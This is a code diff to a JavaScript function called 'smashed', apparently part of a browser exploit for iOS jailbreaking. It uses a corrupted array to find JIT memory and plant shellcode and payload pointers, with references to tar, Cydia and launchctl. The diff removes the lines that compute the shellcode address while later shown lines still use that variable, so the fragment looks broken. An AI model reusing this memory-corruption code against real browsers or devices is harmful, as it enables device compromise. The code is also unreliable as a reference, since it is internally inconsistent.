@@ -96,17 +96,8 @@ function smashed(stale,tar_ptr,cydia_ptr,launchctl_ptr,offsets_ptr) {
 
   console.log("fcp=0x"+fcp.toString(16));
   console.log("binfile=0x"+binfile.toString(16));
-
-
-  // getJIT
-  r2 = smsh[(fcp+0x14)/4];
-  r3 = smsh[(r2+0x10)/4];
-  shellcode = (smsh[(r3+0x14)/4]&0xfffff000)-0x10000;
-  console.log("r2=0x"+r2.toString(16));
-  console.log("r3=0x"+r3.toString(16));
-  console.log("shellcode=0x"+shellcode.toString(16));
-
-  console.log("Plant payload3="+offsets_ptr.toString(16));
+// getJIT
+console.log("Plant payload3="+offsets_ptr.toString(16));
   smsh[shellcode/4] = offsets_ptr;
   shellcode += 4;
 
@@ -121,6 +112,7 @@ function smashed(stale,tar_ptr,cydia_ptr,launchctl_ptr,offsets_ptr) {
   console.log("Plant payload0="+tar_ptr.toString(16));
   smsh[shellcode/4] = tar_ptr;
   shellcode += 4;
+
 
   for(var i = 0; i < filestream.length; i+=4)
   {
